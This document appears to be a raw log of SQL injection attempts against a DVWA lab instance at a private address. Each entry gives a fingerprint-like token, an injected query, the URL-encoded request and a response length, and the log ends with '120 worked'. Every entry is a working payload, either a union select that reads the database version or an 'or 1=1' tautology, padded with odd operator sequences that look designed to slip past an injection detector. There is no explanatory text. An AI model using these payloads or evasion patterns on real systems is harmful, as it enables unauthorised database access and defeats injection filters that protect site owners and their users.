+so1&1: select * from users where id='1' + 1||1 union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=so1%261%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%201%7C%7C1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	225
+
+so1UE: select * from users where id='1' *1 union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=so1UE%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2A1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	221
+
+soc: select * from users where id='1' + @<@# union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=soc%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%40%3C%40%23%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	198
+
+son.&: select * from users where id='1' *$ . or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=son.%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2A%24%20.%20or%201%3D1%20--%201%27&Submit=Submit
+	178
+
+son.U: select * from users where id='1' + $ . union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=son.U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%24%20.%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	197
+
+son1&: select * from users where id='1' *$ 1 or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=son1%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2A%24%201%20or%201%3D1%20--%201%27&Submit=Submit
+	178
+
+sonn&: select * from users where id='1' <@$_ or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sonn%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%24_%20or%201%3D1%20--%201%27&Submit=Submit
+	178
+
+sonnU: select * from users where id='1' <@$_ union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sonnU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%24_%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	196
+
+soo&1: select * from users where id='1' + $+%\ or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=soo%261%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%24%2B%25%5C%20or%201%3D1%20--%201%27&Submit=Submit
+	180
+
+soo1&: select * from users where id='1' <@&1 or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=soo1%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%261%20or%201%3D1%20--%201%27&Submit=Submit
+	178
+
+soo1U: select * from users where id='1' <@&1 union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=soo1U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%261%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	196
+
+sooUE: select * from users where id='1' <@<@ union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sooUE%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%3C%40%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	196
+
+soon&: select * from users where id='1' + $+%$ or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=soon%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%24%2B%25%24%20or%201%3D1%20--%201%27&Submit=Submit
+	180
+
+soonU: select * from users where id='1' + $+*$ union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=soonU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%24%2B%2A%24%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	198
+
+soov&: select * from users where id='1' <@&@ or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=soov%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40%26%40%20or%201%3D1%20--%201%27&Submit=Submit
+	178
+
+soovU: select * from users where id='1' %!<@ union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=soovU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%25%21%3C%40%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	196
+
+sos: select * from users where id='1'<@$$ union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sos%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%3C%40%24%24%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	195
+
+sov(1: select * from users where id='1' + @(1) union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sov%281%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%40%281%29%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	198
+
+sov1U: select * from users where id='1' + @ 1 union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sov1U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%40%201%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	197
+
+sov1o: select * from users where id='1' + @ 1! union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sov1o%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%40%201%21%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	198
+
+sovvU: select * from users where id='1' + @ @1 union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sovvU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%40%20%401%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	198
+
+svUEs: select * from users where id=1 or 1#"@ union select 'a',version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=svUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%40%20union%20select%20%27a%27%2Cversion%28%29%20--%201&Submit=Submit
+	175
+
+s{UEs: select * from users where id=1 or 1#"{ union select 'a',version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%7BUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%7B%20union%20select%20%27a%27%2Cversion%28%29%20--%201&Submit=Submit
+	175
+
+120 worked
